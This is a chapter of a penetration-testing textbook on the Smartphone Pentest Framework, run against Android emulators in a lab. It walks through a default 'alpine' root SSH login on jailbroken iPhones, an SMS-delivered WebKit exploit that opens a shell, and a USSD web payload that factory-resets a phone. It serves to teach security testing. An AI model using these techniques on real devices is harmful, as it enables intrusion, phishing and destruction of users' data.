<html><head></head><body><section class="chapter" epub:type="chapter" id="using_the_smartphone_pentest_framework" title="Chapter&#xA0;20.&#xA0;Using the Smartphone Pentest Framework"><div class="titlepage"><div><div><h2 class="title">Chapter 20. Using the Smartphone Pentest Framework</h2></div></div></div><p><a class="indexterm" id="iddle1734"/><a class="indexterm" id="iddle2168"/><a class="indexterm" id="iddle2210"/><span class="emphasis"><em>Bring your own device (BYOD)</em></span> is a big buzzword in the industry right now. Though we’ve been bringing our own devices to work in one form or another for years (contractor laptops or that game console someone left connected to the network in the breakroom, for example), mobile devices are now entering the workplace en masse, and it falls to security teams and pentesters to evaluate the security risks of these devices.</p><p>In this chapter, we’ll focus on tools and attacks for assessing the security of mobile devices. Mobile technology is a rapidly developing field, and though we can cover only the basics here, developing new mobile attacks and post-exploitation techniques is an ideal place to start with your own security research. For example, we’ll be discussing a tool I created to help pentesters to assess the security posture of mobile devices, the <span class="emphasis"><em>Smartphone Pentest Framework (SPF)</em></span>. After working your way through this book, you will be ready to embark on your own infosec journey and perhaps write a tool of your own.</p><p><a class="indexterm" id="iddle1737"/><a class="indexterm" id="iddle1743"/><a class="indexterm" id="iddle1793"/><a class="indexterm" id="iddle1831"/><a class="indexterm" id="iddle2183"/><a class="indexterm" id="iddle2293"/>For most of the examples in this chapter, we’ll use the Android platform as a target because, in addition to being the most ubiquitous platform, it also allows you to create emulators on Windows, Linux, and Mac OS platforms. Although we’ll focus on Android, we’ll also explore an attack on a jailbroken iPhone.</p><div class="sect1" title="Mobile Attack Vectors"><div class="titlepage"><div><div><h2 class="title" id="mobile_attack_vectors" style="clear: both">Mobile Attack Vectors</h2></div></div></div><p>Though mobile devices run operating systems, speak TCP/IP, and access a lot of the same resources that traditional computers do, they also have their own unique features that add new attack vectors and protocols to the mix. Some features have been causing security problems on devices for years, while others such as near field communication, discussed later, are fairly new.</p><div class="sect2" title="Text Messages"><div class="titlepage"><div><div><h3 class="title" id="text_messages">Text Messages</h3></div></div></div><p>Many mobile devices can send and receive text (SMS) messages. Though limited in size, text messages allow users to communicate almost simultaneously, often replacing email for written communications. SMS opens up a new social-engineering attack vector.</p><p>Traditionally, email has been the medium for sending spam and phishing attempts, but even free email solutions do a decent job of filtering out the garbage these days. (If you ever need a laugh at work, check your email spam folder.) SMS is a different story: Although some mobile antivirus suites allow you to blacklist and whitelist certain mobile numbers, generally if you text a number to a device, the message will be received. This makes SMS an ideal vector for spam and phishing attacks.</p><p>We’re already seeing annoying mobile ads and SMS phishing attempts that lure users to a counterfeit website to enter their credentials, much like the site-cloning attacks from <a class="xref" href="ch11.xhtml" title="Chapter 11. Social Engineering">Chapter 11</a>. These attacks will no doubt become more prevalent as time goes on. Security-awareness training will need to be augmented to include this threat. A user who knows better than to click a random link in a suspicious-looking email may still click a random link in a text message. After all, it’s just a text—how could a text possibly hurt you? But that link will open in the mobile browser or another app that may contain additional vulnerabilities.</p></div><div class="sect2" title="Near Field Communication"><div class="titlepage"><div><div><h3 class="title" id="near_field_communication">Near Field Communication</h3></div></div></div><p>Mobile devices bring yet another attack vector to the table: <span class="emphasis"><em>near field communication</em></span>, or <span class="emphasis"><em>NFC</em></span>. NFC allows devices to share data by touching or being near each other. Mobile devices with NFC enabled can scan NFC tags to automate tasks such as changing settings or opening applications. Some can beam data, such as a photo or an entire app, from one device to another. NFC is another ideal social-engineering attack vector. For example, in Mobile Pwn2Own 2013, an exploitation contest, researchers used NFC to attack an Android device by beaming a malicious payload <a class="indexterm" id="iddle1095"/><a class="indexterm" id="iddle1787"/><a class="indexterm" id="iddle2029"/><a class="indexterm" id="iddle2169"/><a class="indexterm" id="iddle2179"/>to a vulnerable application on the device. Therefore, security awareness training should also teach users to be aware of which NFC tags their device responds to and who they are beaming data with.</p></div><div class="sect2" title="QR Codes"><div class="titlepage"><div><div><h3 class="title" id="qr_codes">QR Codes</h3></div></div></div><p><span class="emphasis"><em>Quick response (QR) codes</em></span> are matrix barcodes originally developed for use in auto manufacturing. QR codes can embed URLs, send data to an application on a mobile device, and so on, and users should be aware that what they are scanning may open something malicious. That QR code on a store window doesn’t have to point to the store’s website, and malicious QR code attacks have occurred in the wild. For instance, one prominent hacktivist changed his Twitter profile picture to a QR code, prompting many curious users to scan it with their phones. The QR code directed them to a malicious web page that attempted to exploit vulnerabilities in WebKit, a web page rendering engine used by both iOS and Android.</p></div></div><div class="sect1" title="The Smartphone Pentest Framework"><div class="titlepage"><div><div><h2 class="title" id="smartphone_pentest_framework-id00051" style="clear: both">The Smartphone Pentest Framework</h2></div></div></div><p>Enough talk; let’s turn our attention to actually attacking mobile devices with the help of SPF. SPF is still under active development and its feature set changes rapidly. By the time you work through this section, many of the menus may offer additional options. In <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>, you downloaded the version of the SPF used in this book, but to get the main and most up-to-date branch of SPF, visit <span class="emphasis"><em><a class="ulink" href="https://github.com/georgiaw/Smartphone-Pentest-Framework.git/" target="_top">https://github.com/georgiaw/Smartphone-Pentest-Framework.git/</a></em></span>.</p><div class="sect2" title="Setting Up SPF"><div class="titlepage"><div><div><h3 class="title" id="setting_up_spf">Setting Up SPF</h3></div></div></div><p>If you followed the instructions in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>, SPF should be all set up and ready to go. Because SPF uses Kali’s built-in web server to deliver some payloads, make sure that the Apache server is running, as shown here.</p><a id="pro_id00217"/><pre class="programlisting">root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# <span class="strong"><strong>service apache2 start</strong></span></pre><p>Additionally, SPF records information in either a MySQL or PostgreSQL database. Make sure the MySQL database is started, as shown here.</p><a id="pro_id00218"/><pre class="programlisting">root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# <span class="strong"><strong>service mysql start</strong></span></pre><p>The last thing to do is edit our SPF configuration file, <span class="emphasis"><em>/root/Smartphone-Pentest-Framework/frameworkconsole/config</em></span>, to match our environment. The default configuration file is shown in <a class="xref" href="ch20.xhtml#spf_config_file" title="Example 20-1. SPF config file">Example 20-1</a>.</p><div class="example"><a id="spf_config_file"/><div class="example-title">Example 20-1. SPF config file</div><div class="example-contents"><pre class="programlisting">root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# <span class="strong"><strong>cat config</strong></span>&#13;
#SMARTPHONE PENTEST FRAMEWORK CONFIG FILE&#13;
#ROOT DIRECTORY FOR THE WEBSERVER THAT WILL HOST OUR FILES&#13;
WEBSERVER = /var/www&#13;
#IPADDRESS FOR WEBSERVER (webserver needs to be listening on this address)&#13;
IPADDRESS = 192.168.20.9 ❶&#13;
#IP ADDRESS TO LISTEN ON FOR SHELLS&#13;
SHELLIPADDRESS = 192.168.20.9 ❷&#13;
#IP ADDRESS OF SQLSERVER 127.0.0.1 IF LOCALHOST&#13;
MYSQLSERVER = 127.0.0.1&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
#NMAP FOR ANDROID LOCATION&#13;
ANDROIDNMAPLOC = /root/Smartphone-Pentest-Framework/nmap-5.61TEST4&#13;
#EXPLOITS LOCATION&#13;
EXPLOITSLOC = /root/Smartphone-Pentest-Framework/exploits</pre></div></div><p><a class="indexterm" id="iddle1250"/><a class="indexterm" id="iddle2180"/>The default should meet your needs if your Kali IP address is 192.168.20.9 and you installed SPF in <span class="emphasis"><em>/root/Smartphone-Pentest-Framework/</em></span>. Otherwise, change the <code class="literal">IPADDRESS</code> ❶ and <code class="literal">SHELLIPADDRESS</code> ❷ to your Kali machine’s IP address.</p><p>Now run SPF by changing the directory to <span class="emphasis"><em>/root/Smartphone-Pentest-Framework/frameworkconsole/</em></span> and running <span class="strong"><strong><code class="literal">./framework.py</code></strong></span>. You should be presented with a menu similar to <a class="xref" href="ch20.xhtml#starting_spf" title="Example 20-2. Starting SPF">Example 20-2</a>.</p><div class="example"><a id="starting_spf"/><div class="example-title">Example 20-2. Starting SPF</div><div class="example-contents"><pre class="programlisting">root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# <span class="strong"><strong>./framework.py</strong></span>&#13;
################################################&#13;
#                                              #&#13;
# Welcome to the Smartphone Pentest Framework! #&#13;
#                   v0.2.6                     #&#13;
#         Georgia Weidman/Bulb Security        #&#13;
#                                              #&#13;
################################################&#13;
&#13;
&#13;
Select An Option from the Menu:&#13;
&#13;
     1.)  Attach Framework to a Deployed Agent/Create Agent&#13;
     2.)  Send Commands to an Agent&#13;
     3.)  View Information Gathered&#13;
     4.)  Attach Framework to a Mobile Modem&#13;
     5.)  Run a remote attack&#13;
     6.)  Run a social engineering or client side attack&#13;
     7.)  Clear/Create Database&#13;
     8.)  Use Metasploit&#13;
     9.)  Compile code to run on mobile devices&#13;
    10.)  Install Stuff&#13;
    11.)  Use Drozer&#13;
     0.)  Exit&#13;
spf&gt;</pre></div></div><p>We will spend the rest of the chapter exploring SPF’s various options. For now, let’s run a quick test to make sure that SPF can communicate with the database. The SPF installer set up an empty database for SPF, but you <a class="indexterm" id="iddle1038"/><a class="indexterm" id="iddle1044"/><a class="indexterm" id="iddle1326"/><a class="indexterm" id="iddle2170"/><a class="indexterm" id="iddle2173"/><a class="indexterm" id="iddle2175"/>can clear out all your data and start fresh by running option <code class="literal">7.) Clear/Create</code> <code class="literal">Database</code>, as shown here. This command will clear the SPF database tables and create them if they do not already exist.</p><a id="pro_id00219"/><pre class="programlisting">spf&gt; <span class="strong"><strong>7</strong></span>&#13;
This will destroy all your data. Are you sure you want to? (y/N)? <span class="strong"><strong>y</strong></span></pre></div><div class="sect2" title="Android Emulators"><div class="titlepage"><div><div><h3 class="title" id="android_emulators">Android Emulators</h3></div></div></div><p>In <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>, we created three Android emulators. Though some of our attacks will work regardless of the Android version, we’ll look at certain client-side and privilege-escalation attacks that work well on emulators that target these specific older versions. Because they’re only emulators, you won’t be able to successfully test all known Android exploits against your Android emulators.</p></div><div class="sect2" title="Attaching a Mobile Modem"><div class="titlepage"><div><div><h3 class="title" id="attaching_a_mobile_modem">Attaching a Mobile Modem</h3></div></div></div><p>Because not all mobile attack vectors use the TCP/IP network, SPF piggybacks on the pentester’s devices. As of this writing, SPF can use the mobile modem of an Android phone with the SPF app installed or USB modem with a SIM card to send SMS messages. Additionally, when using an Android phone with NFC capability, SPF can deliver payloads via Android Beam and the SPF Android App.</p></div><div class="sect2" title="Building the Android App"><div class="titlepage"><div><div><h3 class="title" id="building_the_android_app">Building the Android App</h3></div></div></div><p>To build the Android app from SPF, choose option <code class="literal">4.) Attach Framework to a Mobile Modem</code>, as shown in <a class="xref" href="ch20.xhtml#building_the_spf_app" title="Example 20-3. Building the SPF app">Example 20-3</a>.</p><div class="example"><a id="building_the_spf_app"/><div class="example-title">Example 20-3. Building the SPF app</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>4</strong></span>&#13;
&#13;
Choose a type of modem to attach to:&#13;
    1.) Search for attached modem&#13;
    2.) Attach to a smartphone based app&#13;
    3.) Generate smartphone based app&#13;
    4.) Copy App to Webserver&#13;
    5.) Install App via ADB&#13;
spf&gt; <span class="strong"><strong>3</strong></span>❶&#13;
&#13;
Choose a type of control app to generate:&#13;
    1.) Android App (Android 1.6)&#13;
    2.) Android App with NFC (Android 4.0 and NFC enabled device)&#13;
spf&gt; <span class="strong"><strong>1</strong></span>❷&#13;
Phone number of agent: <span class="strong"><strong>15555215556</strong></span>❸&#13;
Control key for the agent: <span class="strong"><strong>KEYKEY1</strong></span>❹&#13;
Webserver control path for agent: <span class="strong"><strong>/androidagent1</strong></span>❺&#13;
&#13;
Control Number:15555215556&#13;
Control Key:KEYKEY1&#13;
ControlPath:/bookspf&#13;
Is this correct?(y/n)<span class="strong"><strong>y</strong></span>&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
-post-build:&#13;
&#13;
debug:&#13;
&#13;
BUILD SUCCESSFUL&#13;
Total time: 10 seconds</pre></div></div><p><a class="indexterm" id="iddle1045"/><a class="indexterm" id="iddle1265"/>Next select option <code class="literal">3.) Generate smartphone based app</code> ❶. SPF can make two kinds of apps: one that uses NFC, and one that does not. Because our Android emulator lacks NFC capabilities, choose <code class="literal">1.) Android App (Android 1.6)</code> ❷.</p><p>You’ll be asked to enter information about an SPF agent to control via the SPF app. SPF agents allow us to control an infected mobile device. We’ll look at generating and deploying SPF agents later in the chapter; for now, just enter the phone number of your Android 2.2 emulator ❸, a seven-character key ❹, and a path on the web server starting with <code class="literal">/</code> ❺. SPF will then use the Android SDK to build the SPF app.</p></div><div class="sect2" title="Deploying the App"><div class="titlepage"><div><div><h3 class="title" id="deploying_the_app">Deploying the App</h3></div></div></div><p>Now to deploy the app on our Android 4.3 emulator. This emulator will simulate the pentester-controlled device, and the other two emulators will be our targets. If you’re running your emulators on Kali Linux or using real Android devices that you can attach via USB to your Kali virtual machine, you can use Android Debug Bridge (ADB) to install the app, as shown in <a class="xref" href="ch20.xhtml#installing_the_spf_app" title="Example 20-4. Installing the SPF app">Example 20-4</a>. (First, choose option <code class="literal">4.) Attach Framework to a Mobile Modem</code> from the main menu.)</p><div class="example"><a id="installing_the_spf_app"/><div class="example-title">Example 20-4. Installing the SPF app</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>4</strong></span>&#13;
&#13;
Choose a type of modem to attach to:&#13;
    1.) Search for attached modem&#13;
    2.) Attach to a smartphone based app&#13;
    3.) Generate smartphone based app&#13;
    4.) Copy App to Webserver&#13;
    5.) Install App via ADB&#13;
spf&gt; <span class="strong"><strong>5</strong></span>&#13;
* daemon not running. starting it now on port 5037 *&#13;
* daemon started successfully *&#13;
List of devices attached&#13;
emulator-5554     device&#13;
emulator-5556     device&#13;
emulator-5558     device&#13;
Choose a device to install on: <span class="strong"><strong>emulator-5554</strong></span>❶&#13;
Which App?&#13;
&#13;
    1.)Framework Android App with NFC&#13;
&#13;
    2.)Framework Android App without NFC&#13;
&#13;
spf&gt; <span class="strong"><strong>2</strong></span>❷&#13;
1463 KB/s (46775 bytes in 0.031s)&#13;
    pkg: /data/local/tmp/FrameworkAndroidApp.apk&#13;
Success</pre></div></div><p><a class="indexterm" id="iddle1419"/><a class="indexterm" id="iddle2443"/>From the Choose a type of modem to attach to menu, select option <span class="strong"><strong><code class="literal">5</code></strong></span> to have ADB search for all attached devices. Next, tell SPF which emulator or device to install SPF on; in this example I’ve chosen <code class="literal">emulator-5554</code> ❶, the Android 4.3 emulator with phone number 1-555-521-5554. Finally, tell SPF to install the Android app without NFC (option <span class="strong"><strong><code class="literal">2</code></strong></span>) ❷.</p><p>If you’re using emulators on your host system, ADB from Kali will not be able to attach to them. Instead, to deploy the app, choose option <code class="literal">4.) Attach</code> <code class="literal">Framework to a Mobile Modem</code> from the main menu and then choose option <code class="literal">4.) Copy App to Webserver</code>, as shown in <a class="xref" href="ch20.xhtml#copy_app_to_web_server" title="Example 20-5. Copy app to web server">Example 20-5</a>.</p><div class="example"><a id="copy_app_to_web_server"/><div class="example-title">Example 20-5. Copy app to web server</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>4</strong></span>&#13;
&#13;
Choose a type of modem to attach to:&#13;
    1.) Search for attached modem&#13;
    2.) Attach to a smartphone based app&#13;
    3.) Generate smartphone based app&#13;
    4.) Copy App to Webserver&#13;
    5.) Install App via ADB&#13;
spf&gt; <span class="strong"><strong>4</strong></span>&#13;
Which App?&#13;
    1.)Framework Android App with NFC&#13;
    2.)Framework Android App without NFC&#13;
spf&gt; <span class="strong"><strong>2</strong></span>❶&#13;
Hosting Path: <span class="strong"><strong>/bookspf2</strong></span>❷&#13;
Filename: <span class="strong"><strong>/app.apk</strong></span>❸</pre></div></div><p>This will allow us to copy the app to Kali’s web server, where we can download and install it to the emulator. Tell SPF to copy the Framework Android App without NFC ❶, and then tell it where to put the app on the web server ❷. Finally, tell SPF the filename for the app to be downloaded ❸. Download the app from your Android 4.3 emulator by opening the URL <span class="emphasis"><em><a class="ulink" href="http://192.168.20.9/bookspf2/app.apk" target="_top">http://192.168.20.9/bookspf2/app.apk</a></em></span> in the mobile browser.</p></div><div class="sect2" title="Attaching the SPF Server and App"><div class="titlepage"><div><div><h3 class="title" id="attaching_the_spf_server_and_app">Attaching the SPF Server and App</h3></div></div></div><p><a class="indexterm" id="iddle2171"/>Now we need to attach the SPF server and the SPF app, as shown in <a class="xref" href="ch20.xhtml#attaching_to_spf_app" title="Example 20-6. Attaching to SPF app">Example 20-6</a>. (Again, begin with option <span class="strong"><strong><code class="literal">4</code></strong></span> in the main menu.)</p><div class="example"><a id="attaching_to_spf_app"/><div class="example-title">Example 20-6. Attaching to SPF app</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>4</strong></span>&#13;
&#13;
Choose a type of modem to attach to:&#13;
    1.) Search for attached modem&#13;
    2.) Attach to a smartphone based app&#13;
    3.) Generate smartphone based app&#13;
    4.) Copy App to Webserver&#13;
    5.) Install App via ADB&#13;
spf&gt; <span class="strong"><strong>2</strong></span>❶&#13;
&#13;
Connect to a smartphone management app. You will need to supply the phone number, the control key, and the URL path.&#13;
&#13;
Phone Number: <span class="strong"><strong>15555215554</strong></span>❷&#13;
Control Key: <span class="strong"><strong>KEYKEY1</strong></span>❸&#13;
App URL Path: <span class="strong"><strong>/bookapp</strong></span>❹&#13;
&#13;
Phone Number: 15555215554&#13;
Control Key: KEYKEY1&#13;
URL Path: /bookapp&#13;
Is this correct?(y/N): <span class="strong"><strong>y</strong></span></pre></div></div><p>Choose <code class="literal">2.) Attach to a smartphone based app</code> ❶. Next, give SPF the phone number of the emulator running the SPF app ❷, a seven-character key ❸, and the URL where the app will check in ❹. (The key does not need to be the same one we used for the agent when building the app. Also the URL should be different from the one used for the agent when building the app.) Once you’ve confirmed that this information is correct, SPF will appear to hang. We need to attach the app.</p><div class="figure"><a id="spf_app"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00199"/><img alt="SPF app" src="httpatomoreillycomsourcenostarchimages2030588.png.jpg"/></div></div><div class="figure-title">Figure 20-1. SPF app</div></div><p>To attach the app, first open it on the Android emulator. The main screen asks for the IP address of the SPF server, the URL to check in, and the seven-character key. Use the same values as in the previous step (except the IP address should be the IP address of the SPF server rather than the phone number), as shown in <a class="xref" href="ch20.xhtml#spf_app" title="Figure 20-1. SPF app">Figure 20-1</a>.</p><p><a class="indexterm" id="iddle1564"/><a class="indexterm" id="iddle1741"/><a class="indexterm" id="iddle1761"/><a class="indexterm" id="iddle1894"/><a class="indexterm" id="iddle2053"/><a class="indexterm" id="iddle2215"/>After you’ve filled out the information, click <span class="strong"><strong>Attach</strong></span> on the app. You will now be able to control the phone from SPF until you click Detach. Now return to SPF on Kali. When the app is attached, you are dropped back to the main SPF menu, which means we’re ready to start running mobile attacks.</p></div></div><div class="sect1" title="Remote Attacks"><div class="titlepage"><div><div><h2 class="title" id="remote_attacks" style="clear: both">Remote Attacks</h2></div></div></div><p>In the history of mobile devices, there have been attacks on the mobile modem and other externally facing interfaces. For example, researchers found vulnerabilities in the mobile modem drivers for both Android phones and the iPhone that allowed attackers to crash the phone, take it off the mobile network, or even gain command execution on it, just by sending an SMS message. Like traditional computers, as the security position of mobile devices improves, the number of available remote attacks will decrease. That said, the more software users install on their phones, the greater the chance that there’s a potentially vulnerable service listening on a network port, as you’ll learn in the following sections.</p><div class="sect2" title="Default iPhone SSH Login"><div class="titlepage"><div><div><h3 class="title" id="default_iphone_ssh_login">Default iPhone SSH Login</h3></div></div></div><p>One remote attack was perhaps the cause of the first iPhone botnet. On jailbroken iPhones, users can install SSH to log in to their iPhone terminals remotely. By default, SSH has the root password <span class="emphasis"><em>alpine</em></span> on all devices. Of course, users should change this value, but many who jailbreak their iPhones do not. Though this issue came to light years ago, as with many default password issues, it continues to pop up.</p><p>To test for this default SSH password on a jailbroken iPhone, we could choose <code class="literal">5.) Run a Remote Attack</code>, or use our old friend, Metasploit. Much as SET allowed us to create client-side attacks in Metasploit in <a class="xref" href="ch11.xhtml" title="Chapter 11. Social Engineering">Chapter 11</a>, we can use SPF to interface with Msfcli to automate running mobile modules from Metasploit.</p><p>Unfortunately, as of this writing, not much in Metasploit targets mobile devices, but one module does test for use of the default iPhone password. As shown in <a class="xref" href="ch20.xhtml#root_ssh_default_password_metasploit_mod" title="Example 20-7. Root SSH default password Metasploit module">Example 20-7</a>, from the main SPF menu choose <code class="literal">8.) Use Metasploit</code>, and then choose <code class="literal">1.) Run iPhone Metasploit Modules</code>. Next, choose <code class="literal">1.) Cydia Default SSH Password</code>. SPF will ask you for the IP address of the iPhone in order to fill in the <code class="literal">RHOST</code> option in the module. SPF will then call Msfcli and run the desired module.</p><div class="example"><a id="root_ssh_default_password_metasploit_mod"/><div class="example-title">Example 20-7. Root SSH default password Metasploit module</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>8</strong></span>&#13;
Runs smartphonecentric Metasploit modules for you.&#13;
&#13;
Select An Option from the Menu:&#13;
    1.) Run iPhone Metasploit Modules&#13;
    2.) Create Android Meterpreter&#13;
    3.) Setup Metasploit Listener&#13;
spf&gt; <span class="strong"><strong>1</strong></span>&#13;
&#13;
Select An Exploit:&#13;
    1.) Cydia Default SSH Password&#13;
    2.) Email LibTiff iOS 1&#13;
    3.) MobileSafari LibTiff iOS 1&#13;
spf&gt; <span class="strong"><strong>1</strong></span>&#13;
&#13;
Logs in with alpine on a jailbroken iPhone with SSH enabled.&#13;
iPhone IP address: <span class="strong"><strong>192.168.20.13</strong></span>&#13;
[*] Initializing modules...&#13;
RHOST =&gt; 192.168.20.13&#13;
[*] 192.168.20.13:22 - Attempt to login as 'root' with password 'alpine'&#13;
[+] 192.168.20.13:22 - Login Successful with 'root:alpine'&#13;
[*] Found shell.&#13;
[*] Command shell session 1 opened (192.168.20.9:39177 -&gt; 192.168.20.13:22) at 2015-03-21 14:02:44 -0400&#13;
&#13;
<span class="strong"><strong>ls</strong></span>&#13;
Documents&#13;
Library&#13;
Media&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p><a class="indexterm" id="iddle1184"/><a class="indexterm" id="iddle1735"/><a class="indexterm" id="iddle2449"/>If you have a jailbroken iPhone handy, you can test this module. Metasploit will present you with a root shell if the login succeeds. When you are finished, type <span class="strong"><strong><code class="literal">exit</code></strong></span> to close the shell and return to SPF. Of course, if you have SSH on your iPhone, be sure to change the password from <span class="emphasis"><em>alpine</em></span> right away.</p></div></div><div class="sect1" title="Client-Side Attacks"><div class="titlepage"><div><div><h2 class="title" id="client-side_attacks-id00052" style="clear: both">Client-Side Attacks</h2></div></div></div><p>With mobile devices, client-side attacks are more prevalent than remote attacks. And as with the attacks we studied in <a class="xref" href="ch10.xhtml" title="Chapter 10. Client-Side Exploitation">Chapter 10</a>, our client-side attacks are not restricted to the mobile browser. We can attack other default apps on the device as well as any third-party apps that may have bugs.</p><div class="sect2" title="Client-Side Shell"><div class="titlepage"><div><div><h3 class="title" id="client-side_shell">Client-Side Shell</h3></div></div></div><p>Let’s look at an example of attacking the WebKit package in the mobile browser to gain a shell on an Android device. (This is similar to the browser attacks discussed in <a class="xref" href="ch10.xhtml" title="Chapter 10. Client-Side Exploitation">Chapter 10</a>.) We’ll attack a flaw in the mobile browser after enticing the user into opening a malicious page. The executed shellcode will be for Android, not Windows, but the overall attack dynamics are the same, as shown in <a class="xref" href="ch20.xhtml#android_browser_attack" title="Example 20-8. Android browser attack">Example 20-8</a>.</p><div class="example"><a id="android_browser_attack"/><div class="example-title">Example 20-8. Android browser attack</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>6</strong></span>&#13;
Choose a social engineering or client side attack to launch:&#13;
    1.) Direct Download Agent&#13;
    2.) Client Side Shell&#13;
    3.) USSD Webpage Attack (Safe)&#13;
    4 ) USSD Webpage Attack (Malicious)&#13;
&#13;
spf&gt; <span class="strong"><strong>2</strong></span>❶&#13;
Select a Client Side Attack to Run&#13;
&#13;
    1) CVE=2010-1759 Webkit Vuln Android&#13;
&#13;
spf&gt; <span class="strong"><strong>1</strong></span>❷&#13;
Hosting Path: <span class="strong"><strong>/spfbook2</strong></span>❸&#13;
Filename: <span class="strong"><strong>/book.html</strong></span>❹&#13;
&#13;
Delivery Method(SMS or NFC): <span class="strong"><strong>SMS</strong></span>❺&#13;
Phone Number to Attack: <span class="strong"><strong>15555215558</strong></span>&#13;
Custom text(y/N)? <span class="strong"><strong>N</strong></span></pre></div></div><p><a class="indexterm" id="iddle1132"/><a class="indexterm" id="iddle1732"/>From the main SPF menu choose <code class="literal">6.) Run a social engineering or client s</code><code class="literal">ide attack</code>. Now choose <code class="literal">2.) Client Side Shell</code> ❶ then exploit option <code class="literal">1.)</code> <code class="literal">CVE=2010-1759 Webkit Vuln Android</code> ❷. You will be prompted for the path on the web server ❸ and asked for a filename ❹. SPF will then generate a malicious page to attack the CVE-2010-1759 WebKit vulnerability.</p><p>You will then be asked how you want to deliver a link to the malicious page ❺. You can use either NFC or SMS. Because our emulator does not support NFC, we choose SMS. When prompted for the number to attack, send the SMS to your Android 2.1 emulator. Finally, when asked if you want to use custom text for the SMS (rather than the default “This is a cool page: &lt;link&gt;”), change the default to something more creative, or not.</p><p>We have only one mobile modem attached to SPF, so SPF automatically uses it to send the SMS message. SPF contacts our SPF app on the Android 4.3 emulator and instructs it to send a text message to the Android 2.1 emulator. The SMS received by the Android 2.1 emulator will be from the Android 4.3 emulator. (Some mobile devices, such as iPhones, have a flaw in how they implement SMS that allows attackers to spoof the sender number to make it look like this attack came from any number they’d like.) The message received is shown here.</p><a id="pro_id00220"/><pre class="programlisting">15555215554: This is a cool page: http://192.168.20.9/spfbook2/book.html</pre><p>Like the client-side attacks discussed in <a class="xref" href="ch10.xhtml" title="Chapter 10. Client-Side Exploitation">Chapter 10</a>, this attack relies on the user opening the link in a vulnerable mobile browser. Our Android 2.1 emulator browser is vulnerable to the attack, and when you click the link to open the mobile browser, the browser will attempt to open the page for 30 seconds or so as the attack is running, before crashing. At that point, you should have a shell waiting for you in SPF. SPF automatically runs the Android equivalent of <code class="literal">whoami</code> when the shell opens.</p><p>Because we attacked the browser, we’re running as <span class="emphasis"><em>app_2</em></span>, the mobile browser on our emulator. As usual, the shell has all the permissions of the exploited app, meaning that you can run any commands available to the browser. For example, enter <span class="strong"><strong><code class="literal">/system/bin/ls</code></strong></span>, as shown in <a class="xref" href="ch20.xhtml#android_shell" title="Example 20-9. Android shell">Example 20-9</a>, to use <code class="literal">ls</code> to list the contents of the current directory. When you’ve finished, enter <span class="strong"><strong><code class="literal">exit</code></strong></span> to return to SPF.</p><div class="example"><a id="android_shell"/><div class="example-title">Example 20-9. Android shell</div><div class="example-contents"><pre class="programlisting">Connected: Try exit to quit&#13;
uid=10002(app_2) gid=10002(app_2) groups=1015(sdcard_rw),3003(inet)&#13;
<span class="strong"><strong>/system/bin/ls</strong></span>&#13;
sqlite_stmt_journals&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
<span class="strong"><strong>exit</strong></span></pre></div></div><div class="note" title="Note"><h3 class="title"><a id="ch20note01"/>Note</h3><p><a class="indexterm" id="iddle1037"/><a class="indexterm" id="iddle1393"/><a class="indexterm" id="iddle2056"/><a class="indexterm" id="iddle2329"/><a class="indexterm" id="iddle2357"/>Android is a forked Linux kernel, so once we have a shell, we should be ready to go with Android, right? Unfortunately, many Linux utilities like <code class="literal">cp</code> aren’t there. Additionally, the user structure is a bit different, with each app having its own UID. A deep dive into Android, however, is beyond the scope of this chapter.</p></div><p>We’ll look at an alternative way to control exploited Android devices, using backdoored apps to call Android APIs, later in this chapter. But first let’s look at another client-side attack.</p></div><div class="sect2" title="USSD Remote Control"><div class="titlepage"><div><div><h3 class="title" id="ussd_remote_control">USSD Remote Control</h3></div></div></div><p><span class="emphasis"><em>Unstructured Supplementary Service Data (USSD)</em></span> is a way for mobile devices to communicate with the mobile network. When you dial specific numbers, the device will perform certain functions.</p><p>In late 2012, it came to light that some Android devices would automatically open a number they discovered on a web page in the dialer application. When USSD codes are entered in the dialer, the functionality is automatically called. That sounds like a great function for attackers to abuse to control a device remotely.</p><p>As it turned out, attackers could put USSD codes in a web page as the number to dial and end up forcing these vulnerable devices to do all sorts of interesting things. For example, as shown here, the <code class="literal">tel:</code> tag in a malicious web page tells Android this is a phone number. But when the USSD code <code class="literal">2673855%23</code> is opened in the dialer, the device performs a factory restore, deleting all the user’s data.</p><a id="pro_id00221"/><pre class="programlisting">&lt;html&gt;&#13;
&lt;frameset&gt;&#13;
&lt;frame src="tel:*2767*3855%23" /&gt;&#13;
&lt;/frameset&gt;&#13;
&lt;/html&gt;</pre><div class="note" title="Note"><h3 class="title"><a id="ch20note02"/>Note</h3><p>The vulnerability is not in the USSD code itself, but in certain devices’ implementation of the <code class="literal">tel:</code> tag. Various USSD tags offer all sorts of functionality.</p></div><p>Our example will use a more innocuous payload than the one described previously. We’ll have our device automatically dial a code to present its unique identifier in a pop-up, as shown in <a class="xref" href="ch20.xhtml#android_ussd_attack" title="Example 20-10. Android USSD attack">Example 20-10</a>.</p><div class="example"><a id="android_ussd_attack"/><div class="example-title">Example 20-10. Android USSD attack</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>6</strong></span>&#13;
Choose a social engineering or client side attack to launch:&#13;
    1.) Direct Download Agent&#13;
    2.) Client Side Shell&#13;
    3.) USSD Webpage Attack (Safe)&#13;
    4 ) USSD Webpage Attack (Malicious)&#13;
spf&gt; <span class="strong"><strong>3</strong></span>❶&#13;
Hosting Path: <span class="strong"><strong>/spfbook2</strong></span>&#13;
